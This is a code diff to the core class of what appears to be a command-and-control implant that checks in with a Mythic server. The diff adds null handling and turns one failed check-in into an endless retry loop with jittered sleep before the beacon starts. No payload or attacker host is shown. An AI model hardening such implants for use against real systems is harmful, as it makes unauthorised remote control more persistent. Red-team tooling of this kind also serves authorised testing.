@@ -16,7 +16,7 @@ namespace Agent
         private ILogger logger { get; set; }
         private ITaskManager taskManager { get; set; }
         private ITokenManager tokenManager { get; set; }
-        private IProfile _profile;
+        private IProfile? _profile;
 
         //Will need ISocksManager, IRpfwdManager, IForwarderManager
         public AthenaCore(IEnumerable<IProfile> profiles, ITaskManager taskManager, ILogger logger, IAgentConfig config, ITokenManager tokenManager, IEnumerable<IAgentMod> mods)
@@ -29,7 +29,14 @@ namespace Agent
             this.mods = mods;
 
             _profile = SelectProfile(99);
-            _profile.SetTaskingReceived += OnTaskingReceived;
+            if (_profile is not null)
+            {
+                _profile.SetTaskingReceived += OnTaskingReceived;
+            }
+            else
+            {
+                this.logger.Log("No communication profiles available.");
+            }
         }
         public async Task Start()
         {
@@ -38,13 +45,27 @@ namespace Agent
                 Environment.Exit(0);
             }
 
-            await this.ApplyMods();
-            if (!await this.CheckIn())
+            if (this._profile is null)
             {
-                throw new InvalidOperationException("Agent check-in failed; beacon was not started.");
+                this.logger.Log("Cannot start agent: no valid profile is configured.");
+                return;
             }
 
-            await this._profile.StartBeacon();
+            await this.ApplyMods().ConfigureAwait(false);
+            while (!await this.CheckIn().ConfigureAwait(false))
+            {
+                this.logger.Log("Agent check-in failed; retrying...");
+                await Task.Delay(Misc.GetSleep(this.config.sleep, this.config.jitter) * 1000).ConfigureAwait(false);
+            }
+
+            try
+            {
+                await this._profile.StartBeacon().ConfigureAwait(false);
+            }
+            catch (Exception ex)
+            {
+                this.logger.Log($"Beacon loop terminated with error: {ex}");
+            }
         }
 
         private async Task ApplyMods()
@@ -68,10 +89,17 @@ namespace Agent
             }
         }
 
-        private IProfile SelectProfile(int index) =>
-            index == 99 //Default Value
+        private IProfile? SelectProfile(int index)
+        {
+            if (profiles == null || !profiles.Any())
+            {
+                return null;
+            }
+
+            return index == 99
                 ? profiles.ElementAt(Random.Shared.Next(profiles.Count()))
-                : profiles.ElementAt(index);
+                : profiles.ElementAtOrDefault(index) ?? profiles.First();
+        }
 
         /// <summary>
         /// Performa  check-in with the Mythic server
